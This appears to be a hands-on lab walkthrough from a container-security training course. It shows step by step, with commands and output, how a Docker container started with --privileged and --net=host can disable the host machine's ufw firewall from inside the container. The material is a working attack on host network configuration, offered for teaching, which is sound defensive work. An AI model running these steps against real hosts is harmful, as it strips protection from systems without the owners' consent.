## Tamper Host Network Configuration


###### By setting `--privileged` and `--net=host` flag when running a container, network-stack of the host machine can be tampered with. 

###### In this Attack, `Uncomplicated Firewall(ufw)` of the host-machine is disabled from a container.

##### Step 1:

* Open Terminal

![](img/Open-Terminal.png)

##### Step 2:

* Check if `ufw` is enabled on the host machine by running `ufw status`

```commandline
root@we45:~# ufw status
Status: inactive
```

##### Step 3:

* Enable `ufw` by running `ufw enable`

```commandline
root@we45:~# ufw enable
Firewall is active and enabled on system startup
```

##### Step 4:

* Run `docker run -d --privileged --net=host --name vul_flask abhaybhargav/vul_flask` to start a docker container.

```commandline
root@we45:~# docker run -d --privileged --net=host --name vul_flask abhaybhargav/vul_flask
6733abdce5042a90db8b7d40a08155470c727e8b3864eda519714e172f63be88
```
 
##### Step 5:   

* Run `docker ps` to view, all running containers.

```commandline
root@we45:~# docker ps
CONTAINER ID        IMAGE                    COMMAND             CREATED             STATUS              PORTS               NAMES
d0169e5801fe        abhaybhargav/vul_flask   "python app.py"     24 seconds ago      Up 22 seconds       5050/tcp            vul_flask
```
     
![](img/docker-ps.png)
    
##### Step 6:   

* Run `docker exec -it vul_flask bash` to exec into a running container.

```commandline
root@we45:~# docker exec -it vul_flask bash
root@d0169e5801fe:/apps# 
```

![](img/docker-exec.png)
   
##### Step 7:

* Install `ufw` on the container by running `apt update && apt install -y ufw`

```commandline
root@we45:/apps# apt update && apt install -y ufw
```
    
##### Step 8:

* Run `ufw status` to verify if ufw is running.

```commandline
root@we45:/apps# ufw status
Status: active
```
    
##### Step 9:

* To disable `ufw` of the host machine, run `ufw disable` on the container

```commandline
root@we45:/apps# ufw disable
Firewall stopped and disabled on system startup
```

* Run `ufw status` to verify ufw is stopped or not.

```commandline
root@we45:/apps# ufw status
Status: inactive
```
 
##### Step 10:

* Run `exit` to exit from the container

```commandline
root@we45:/apps# exit
exit
```

##### Step 11:

* Run `ufw status` in the host machine to verify if ufw has been disabled.

```commandline
root@we45:~# ufw status
Status: inactive
```

##### Stop all running docker containers

* Run `clean-docker` to stop all the containers

```commandline
root@we45:~$ clean-docker
```
